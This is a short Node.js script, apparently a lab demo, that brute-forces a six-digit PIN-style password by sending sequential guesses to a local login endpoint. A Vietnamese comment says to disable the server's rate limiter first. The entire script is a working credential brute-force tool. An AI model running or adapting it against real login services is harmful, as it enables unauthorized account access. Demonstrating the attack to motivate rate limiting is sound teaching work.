const axios = require('axios');
const readline = require('readline');

// Khi chay client , phai bo middleware rateLimit truoc khi chay server

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question('Username: ', (username) => {
  const startTime = Date.now();
  const password = '000000';
  

  const intervalId = setInterval(() => {
    const currentTime = Date.now();
    const elapsedTime = ((currentTime - startTime) / 1000).toFixed(2);
    console.clear();
    console.log(`Elapsed time: ${elapsedTime} seconds`);
    console.log('Finding password...');
  }, 1000);

  function tryPassword(curPassword) {
    axios.post('http://localhost:3000/login', {
      username: username,
      password: curPassword
    })
    .then(res => {
      if (res.data.result === 'success') {
        const endTime = Date.now();
        console.log(`Password found: ${curPassword}`);
        console.log(`Time: ${(endTime - startTime) / 1000} seconds`);
        clearInterval(intervalId);
        rl.close();
      } else {
        const nextPassword = (parseInt(curPassword) + 1).toString().padStart(6, '0');
        tryPassword(nextPassword);
      }
    })
    .catch(error => {
      console.error(error);
      clearInterval(intervalId);
      rl.close();
    });
  }

  tryPassword(password);
});
